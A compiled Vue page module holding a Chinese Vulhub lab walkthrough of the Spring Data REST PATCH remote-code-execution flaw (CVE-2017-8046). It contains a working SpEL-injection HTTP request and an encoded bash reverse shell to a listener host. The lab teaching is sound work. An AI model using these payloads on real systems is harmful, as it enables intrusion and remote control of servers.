import{_ as s}from"./plugin-vue_export-helper-c27b6911.js";import{r as i,o,c as l,a as e,b as n,d as t,e as c}from"./app-58e4a7d6.js";const r={},p=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),d={href:"https://tools.ietf.org/html/rfc6902",target:"_blank",rel:"noopener noreferrer"},u=e("code",null,"setValue",-1),g=e("p",null,"参考链接：",-1),m={href:"http://xxlegend.com/2017/09/29/Spring%20Data%20Rest",target:"_blank",rel:"noopener noreferrer"},h={href:"http://xxlegend.com/2017/09/29/Spring",target:"_blank",rel:"noopener noreferrer"},b={href:"https://tech.meituan.com/Spring_Data_REST_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2017-8046)_%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html",target:"_blank",rel:"noopener noreferrer"},v=c(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>等待环境启动完成，然后访问 <code>http://your-ip:8080/</code> 即可看到 json 格式的返回值，说明这是一个 Restful 风格的 API 服务器。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011443101.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>先将命令转为 ASCII 码表示：</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment"># Payload to ASCII</span>
payload <span class="token operator">=</span> <span class="token string">b&#39;touch /tmp/awesome_poc&#39;</span>
bytecode <span class="token operator">=</span> <span class="token string">&#39;,&#39;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>bytecode<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>116,111,117,99,104,32,47,116,109,112,47,97,119,101,115,111,109,101,95,112,111,99
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>开始复现，访问 <code>http://your-ip:8080/customers/1</code>，看到一个资源。我们使用 PATCH 请求来修改之：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PATCH /customers/1 HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,97,119,101,115,111,109,101,95,112,111,99}))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>path 的值是 SpEL 表达式，发送上述数据包，将执行 <code>new byte[]{116,111,117,99,104,32,47,116,109,112,47,97,119,101,115,111,109,101,95,112,111,99}</code> 表示的命令 <code>touch /tmp/awesome_poc</code>。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011455445.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器 <code>docker-compose exec spring bash</code> 查看，可见，文件 <code>awesome_poc</code> 被成功创建：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011455722.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将 bytecode 改成反弹 shell 的命令，并进行转换：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 反弹shell命令
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=}|{base64,-d}|{bash,-i}

# bytecode
98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,109,70,122,97,67,65,116,97,83,65,43,74,105,65,118,90,71,86,50,76,51,82,106,99,67,56,120,79,84,73,117,77,84,89,52,76,106,69,51,78,67,52,120,77,106,103,118,79,84,107,53,79,83,65,119,80,105,89,120,67,103,111,61,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>发送数据包：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011458842.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功接收反弹 shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011458521.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,22);function _(x,f){const a=i("ExternalLinkIcon");return o(),l("div",null,[p,e("p",null,[n("Spring Data REST 是一个构建在 Spring Data 之上，为了帮助开发者更加容易地开发 REST 风格的 Web 服务。在 REST API 的 Patch 方法中（实现 "),e("a",d,[n("RFC6902"),t(a)]),n("），path 的值被传入 "),u,n("，导致执行了 SpEL 表达式，触发远程命令执行漏洞。")]),g,e("ul",null,[e("li",null,[n("["),e("a",m,[n("http://xxlegend.com/2017/09/29/Spring Data Rest"),t(a)]),n(" 服务器 PATCH 请求远程代码执行漏洞 CVE-2017-8046 补充分析/]("),e("a",h,[n("http://xxlegend.com/2017/09/29/Spring"),t(a)]),n(" Data Rest 服务器 PATCH 请求远程代码执行漏洞 CVE-2017-8046 补充分析/)")]),e("li",null,[e("a",b,[n("https://tech.meituan.com/Spring_Data_REST_远程代码执行漏洞%28CVE-2017-8046%29_分析与复现.html"),t(a)])])]),v])}const C=s(r,[["render",_],["__file","Spring Data Rest 远程命令执行漏洞 CVE-2017-8046.html.vue"]]);export{C as default};
